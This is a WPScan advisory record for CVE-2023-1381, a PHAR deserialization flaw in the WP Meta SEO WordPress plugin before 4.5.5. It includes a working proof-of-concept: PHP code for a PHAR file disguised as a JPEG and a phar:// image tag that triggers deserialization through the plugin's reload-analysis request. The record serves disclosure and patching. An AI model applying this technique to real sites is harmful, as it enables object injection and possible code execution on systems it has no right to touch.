["https://wpscan.com/vulnerability/f140a928-d297-4bd1-8552-bfebcedba536"]
title = "WP Meta SEO < 4.5.5 – Author+ PHAR Deserialization | CVE 2023-1381 | Plugin Vulnerabilities"
description = """
Description
\t\t\tThe plugin does not validate image file paths before attempting to manipulate the image files, leading to a PHAR deserialization vulnerability. Furthermore, the plugin contains a gadget chain which may be used in certain configurations to achieve remote code execution."""
full_description = '''WordPress Plugin Vulnerabilities WP Meta SEO < 4.5.5 - Author+ PHAR Deserialization Description The plugin does not validate image file paths before attempting to manipulate the image files, leading to a PHAR deserialization vulnerability. Furthermore, the plugin contains a gadget chain which may be used in certain configurations to achieve remote code execution. Proof of Concept 1. Use a WordPress instance on PHP 7.x. 2. Create a PHP file `create_phar.php` with the following code: <?php class Evil {} // create new Phar $phar = new Phar('poc.phar'); $phar->startBuffering(); $phar->addFromString('test.png', 'text'); $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>"); $phar->setMetadata(new Evil()); $phar->stopBuffering(); 3. Create the PHAR file `poc.phar` by running `php --define phar.readonly=0 create_phar.php` 4. Rename `poc.phar` to `poc.jpg` 5. Upload `poc.jpg` using the Media Editor. Take note of its path within `wp-content/uploads` 6. Add the following code to the site in order to simulate a gadget: class Evil { public function __wakeup() : void { die("Arbitrary deserialization"); } } 7. Create or edit a post or page in the block editor. Add an `HTML` block with the following contents (but replace any parts of the path to `poc.jpg` as needed for your test server). <img src="phar://../wp-content/uploads/2023/03/poc.jpg/test.txt"> 8. Without saving the post or page, open the browser console to view network traffic, then click on “Reload Analysis” in the “SEO Page Optimization” section. Notice the `admin-ajax` request with `action=wpms` and `task=reload_analysis` returns with the text “Arbitrary deserialization”, demonstrating the vulnerability. Affects Plugins wp-meta-seo Fixed in 4.5.5 References CVE CVE-2023-1381 URL https://blog.wpscan.com/uncovering-a-phar-deserialization-vulnerability-in-wp-meta-seo-and-escalating-to-rce/ Classification Type OBJECT INJECTION OWASP top 10 A8: Insecure Deserialization CWE CWE-502 CVSS 7.2 (high) Miscellaneous Original Researcher Alex Sanford Submitter Alex Sanford Submitter website https://wpscan.com Verified Yes WPVDB ID f140a928-d297-4bd1-8552-bfebcedba536 Timeline Publicly Published 2023-03-27 (about 1 year ago) Added 2023-03-27 (about 1 year ago) Last Updated 2023-04-10 (about 1 year ago) Other Published Title Published 2023-11-07 Title Master Slider Pro <= 3.6.5 - Unauthenticated PHP Object Injection Published 2025-02-07 Title WP All Import Pro < 4.9.8 - Authenticated (Administrator+) PHP Object Injection via Import File Published 2024-01-16 Title Asgaros Forum < 2.8.0 - Unauthenticated PHP Object Injection in prepare_unread_status Published 2021-06-22 Title CiviCRM < 5.24.3 - Authenticated Phar Deserialization Published 2023-11-13 Title Image Compressor & Optimizer - iLoveIMG < 1.0.6 - Admin+ PHP Object Injection'''
